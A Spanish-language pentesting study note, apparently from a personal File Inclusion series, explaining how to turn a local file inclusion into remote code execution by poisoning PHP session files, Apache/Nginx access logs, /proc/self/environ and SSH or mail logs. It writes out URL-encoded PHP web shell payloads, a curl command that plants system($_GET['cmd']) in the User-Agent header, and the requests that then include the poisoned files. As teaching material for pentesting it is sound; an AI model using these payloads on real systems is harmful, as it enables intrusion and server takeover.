---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Inclusion
Descripción: "Cuando no podemos subir un fichero ni incluir uno remoto, queda una tercera vía a RCE: que sea el propio servidor quien escriba nuestro código en un fichero"
Fecha de actualización: 2026-06-22
Nota previa: "[[06 - LFI + File Upload a RCE]]"
Nota siguiente: "[[08 - Detección y fuzzing automatizado]]"
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Cuando no podemos [[06 - LFI + File Upload a RCE|subir un fichero]] ni [[05 - Remote File Inclusion (RFI)|incluir uno remoto]], queda una tercera vía a RCE: que sea **el propio servidor** quien escriba nuestro código en un fichero. <mark style="background: #ADCCFFA6;">El log poisoning consiste en inyectar código PHP en un campo que acaba registrado en un fichero (un log, una sesión) y después incluir ese fichero con la LFI para ejecutarlo</mark>. Funciona con cualquier [[00 - Introducción a File Inclusion|sink con capacidad de ejecución]] y solo exige una condición: que la app tenga **permiso de lectura** sobre el fichero envenenado.

# PHP session poisoning

Las apps PHP guardan datos de sesión en ficheros del back-end. El nombre del fichero es el valor de la cookie `PHPSESSID` con el prefijo `sess_`:

- **Linux**: `/var/lib/php/sessions/sess_<PHPSESSID>`
- **Windows**: depende de `session.save_path` (sin ruta universal); en XAMPP suele ser `C:\xampp\tmp\sess_<PHPSESSID>`. Confírmala leyendo `php.ini` o un `phpinfo()`.

El ataque tiene cuatro pasos. Primero, **incluir nuestro propio fichero de sesión** para ver qué datos contiene y cuáles controlamos:

```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

Si vemos un valor reflejado de un parámetro nuestro (p. ej. la app guarda `?language=` como `page`), lo confirmamos cambiándolo:

```
/index.php?language=session_poisoning
```

Al re-incluir el fichero de sesión, debe aparecer `session_poisoning`. Confirmado el control, **envenenamos** con un web shell URL-encodeado:

```
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Y por último incluimos la sesión ejecutando comando:

```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

> [!warning]+ La sesión se sobrescribe en cada inclusión
> Tras incluir el fichero, el valor `page` se actualiza con la última petición, **borrando** el web shell. Hay que re-envenenar antes de cada ejecución. Lo práctico es usar el primer RCE para <mark style="background: #FF5582A6;">escribir un web shell permanente en el webroot o lanzar una reverse shell</mark>, y dejar de depender de la sesión.

> [!important]+ `PHP_SESSION_UPLOAD_PROGRESS` — cuando no controlas ningún valor de sesión
> Si la sesión no guarda ningún dato controlable, se puede **forzar** uno. Con `session.upload_progress.enabled = On` (valor por defecto), al enviar un `POST` *multipart* que incluya un campo `PHP_SESSION_UPLOAD_PROGRESS`, PHP escribe su contenido en el fichero de sesión. Metiendo el web shell en ese campo, contaminamos la sesión sin necesidad de un parámetro reflejado. PHP limpia ese valor al completarse la subida, así que hay una pequeña carrera, pero es de las técnicas más fiables en apps modernas. Detalle en [HackTricks — via PHP_SESSION_UPLOAD_PROGRESS](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php_session_upload_progress).

# Server log poisoning (Apache / Nginx)

El `access.log` registra, entre otras cosas, la cabecera `User-Agent` de cada petición — y esa cabecera la controlamos nosotros. Envenenamos el `User-Agent` con código PHP y luego incluimos el log.

<mark style="background: #FFB8EBA6;">El factor decisivo es el permiso de lectura</mark>, y **depende de la distro y la config**: los logs de **Apache** suelen ser `640 root:adm` (ilegibles para `www-data`); los de **Nginx**, según la instalación, pueden pertenecer al usuario del worker y quedar legibles. No lo des por hecho —prueba a incluir el log; si falla por permisos, cambia de vector—. Rutas por defecto:

| Servicio | Debian / Ubuntu | RHEL / CentOS | Windows (XAMPP) |
| - | - | - | - |
| Apache `access` | `/var/log/apache2/access.log` | `/var/log/httpd/access_log` | `C:\xampp\apache\logs\access.log` |
| Apache `error` | `/var/log/apache2/error.log` | `/var/log/httpd/error_log` | `C:\xampp\apache\logs\error.log` |
| Nginx | `/var/log/nginx/access.log` | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |

Si la ruta no es la estándar, se [[08 - Detección y fuzzing automatizado|fuzzea con una wordlist LFI]], o se lee la config del servidor (`/etc/apache2/apache2.conf` → variable `APACHE_LOG_DIR` en `/etc/apache2/envvars`) para localizarla.

Primero confirmamos que podemos leer el log:

```
/index.php?language=/var/log/apache2/access.log
```

Después envenenamos el `User-Agent`. Con `curl` es directo (un fichero de cabecera evita problemas de escaping del shell):

```shell-session
$ echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
$ curl -s "http://target/index.php" -H @Poison
```

Y se incluye el log pasando el comando:

```
/index.php?language=/var/log/apache2/access.log&cmd=id
```

> [!warning]+ Los logs pesan — cuidado en producción
> Un `access.log` real puede ocupar cientos de MB. Incluirlo por LFI puede tardar mucho o, en el peor caso, tumbar el servidor. <mark style="background: #FFB86CA6;">En un objetivo en producción, sé quirúrgico</mark>: no lances peticiones innecesarias. Cualquier petición se loguea, así que puedes envenenar desde una petición distinta a la de la LFI.

# `/proc/self/` como alternativa sin acceso a logs

Si no tenemos lectura sobre los logs, el pseudo-sistema `/proc` ofrece vías equivalentes:

- **`/proc/self/environ`**: contiene las variables de entorno del proceso, incluida `HTTP_USER_AGENT`. Se envenena igual que un log: inyectar PHP en el `User-Agent` e incluir `environ`.
- **`/proc/self/fd/N`**: los descriptores de fichero abiertos por el proceso PHP. Haciendo *bruteforce* de `N` (típicamente `0`–`50`) podemos toparnos con el handle de un log al que no llegábamos por su ruta.
- **`/proc/self/cmdline`**: revela la línea de comandos del proceso — útil para descubrir rutas absolutas.

```
/index.php?language=../../../../proc/self/environ&cmd=id
```

Estos ficheros también suelen requerir privilegios, así que no siempre están disponibles.

# Otros logs de servicio

Cualquier log que registre un valor que controlamos **y** podamos leer es candidato. Los clásicos:

- **`/var/log/auth.log`** (Debian/Ubuntu) o **`/var/log/secure`** (RHEL/CentOS): si SSH está expuesto, intentar loguear con un **username** que sea código PHP — queda registrado en el log de autenticación.
- **`/var/log/mail`** o `/var/mail/<user>`: enviar un correo con el cuerpo/asunto envenenado.
- **`/var/log/vsftpd.log`**: loguear en FTP con username malicioso.

La metodología es general: localizar un log legible que registre una entrada nuestra, envenenarla, e incluir el log.

# Gotchas de stacks modernos

- <mark style="background: #8000E1A6;">**Logging estructurado mata esta técnica**</mark>: si la app loguea a `journald` (binario, no incluible como PHP), a syslog remoto, o a un sink cloud (CloudWatch, ELK, Loki) en vez de a ficheros planos, no hay fichero de texto que envenenar e incluir. Cada vez más común — verifica el destino real de los logs antes de invertir tiempo.
- **Hardening de permisos**: distros modernas restringen la lectura de logs; `SELinux`/`AppArmor` pueden impedir que `www-data` lea `/var/log` aunque los permisos POSIX lo permitan.
- **Sanitización de logs**: algunos servidores escapan caracteres de control en el `User-Agent`, rompiendo el payload.

> [!info]+ Fuentes
> - [HackTricks — LFI2RCE via logs / sessions](https://book.hacktricks.xyz/pentesting-web/file-inclusion) · [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
> - [PHP — `session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php)

Con todas las vías de explotación cubiertas, toca la fase de **encontrar y confirmar** la vulnerabilidad —incluyendo la LFI a ciegas— y automatizar el proceso: [[08 - Detección y fuzzing automatizado]].
